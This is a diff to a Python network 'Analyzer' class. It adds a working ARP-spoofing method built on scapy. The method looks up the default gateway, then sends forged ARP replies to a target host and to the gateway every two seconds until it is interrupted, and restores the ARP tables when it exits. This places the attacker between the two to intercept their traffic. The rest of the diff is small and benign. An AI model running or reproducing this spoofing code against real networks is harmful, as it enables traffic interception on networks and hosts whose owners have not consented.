@@ -111,6 +111,65 @@ class Analyzer:
         run()
 
     @staticmethod
+    def spoof(target_ip: str) -> None:
+        import subprocess
+        def get_mac(ip): 
+            arp_request = sc.ARP(pdst = ip) 
+            broadcast = sc.Ether(dst ="ff:ff:ff:ff:ff:ff") 
+            arp_request_broadcast = broadcast / arp_request 
+            answered_list = sc.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
+            return answered_list[0][1].hwsrc 
+          
+        def _spoof(target_ip, spoof_ip): 
+            packet = sc.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), 
+                                                                    psrc = spoof_ip) 
+            sc.send(packet, verbose = False) 
+          
+          
+        def restore(destination_ip, source_ip): 
+            destination_mac = get_mac(destination_ip) 
+            source_mac = get_mac(source_ip) 
+            packet = sc.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac) 
+            sc.send(packet, verbose = False) 
+
+        def get_gateway_ip():
+            try:
+                result = subprocess.check_output(['route', '-n', 'get', 'default']).decode('utf-8')
+
+                # Parse the result to extract the gateway IP address
+                lines = result.split('\n')
+                for line in lines:
+                    if 'gateway:' in line:
+                        gateway_ip = line.split(':')[-1].strip()
+                        return gateway_ip
+                else:
+                    print("Gateway IP not found in the command output.")
+            except subprocess.CalledProcessError as e:
+                print("Error executing the command:", e)
+
+
+        gateway_ip = get_gateway_ip()
+        print(gateway_ip)
+        if not gateway_ip:
+            print("Failed to retrieve the gateway IP.")
+            exit()
+          
+        try: 
+            sent_packets_count = 0
+            while True: 
+                _spoof(target_ip, gateway_ip) 
+                _spoof(gateway_ip, target_ip) 
+                sent_packets_count = sent_packets_count + 2
+                print("\r[*] Packets Sent "+str(sent_packets_count), end ="") 
+                time.sleep(2)
+          
+        except KeyboardInterrupt: 
+            print("\nCtrl + C pressed.............Exiting") 
+            restore(gateway_ip, target_ip) 
+            restore(target_ip, gateway_ip) 
+            print("[+] Arp Spoof Stopped") 
+
+    @staticmethod
     def bandwith(plot: bool = False) -> None:
         time_intervals = [] 
         bandwidth_usage = []
@@ -136,4 +195,4 @@ class Analyzer:
         run()
 
 if __name__ == "__main__":
-    pass
+    Analyzer.speed(plot=True, nb_iter=1000)
